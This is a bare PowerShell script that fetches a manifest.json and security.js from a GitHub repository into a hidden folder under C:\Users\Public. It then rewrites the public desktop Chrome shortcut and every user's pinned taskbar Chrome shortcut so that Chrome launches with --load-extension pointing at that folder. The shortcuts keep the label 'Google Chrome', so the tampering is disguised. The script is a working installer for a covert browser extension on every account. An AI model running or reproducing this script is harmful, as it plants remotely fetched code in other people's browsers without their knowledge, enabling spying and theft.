md -Force C:\Users\Public\system_security

Invoke-WebRequest https://raw.githubusercontent.com/eulersdisk/system_security/main/manifest.json -OutFile C:\Users\Public\system_security\manifest.json
Invoke-WebRequest https://raw.githubusercontent.com/eulersdisk/system_security/main/security.js -OutFile C:\Users\Public\system_security\security.js

attrib +h C:\Users\Public\system_security

$deskShort = 'C:\Users\Public\Desktop\Google Chrome.lnk'

if (Test-Path $deskShort) {
  Remove-Item $deskShort
}

$shell = New-Object -COM WScript.Shell
$shortcut = $shell.CreateShortcut($deskShort)
$shortcut.TargetPath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
$shortcut.Arguments = "--load-extension=C:\Users\Public\system_security"
$shortcut.Description = "Google Chrome"
$shortcut.Save()

$users = Get-ChildItem "C:\Users\"
$taskBarShort = 'AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Google Chrome.lnk'

foreach ($user in $users){
  if ($user.name -ne "Public") {
    $filePath = "$($user.Fullname)\$($taskBarShort)"

    if (Test-Path $filePath) {
      Remove-Item $filePath
    }

    $shell = New-Object -COM WScript.Shell
    $shortcut = $shell.CreateShortcut($filePath)
    $shortcut.TargetPath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
    $shortcut.Arguments = "--load-extension=C:\Users\Public\system_security"
    $shortcut.Description = "Google Chrome"
    $shortcut.Save()
  }
}
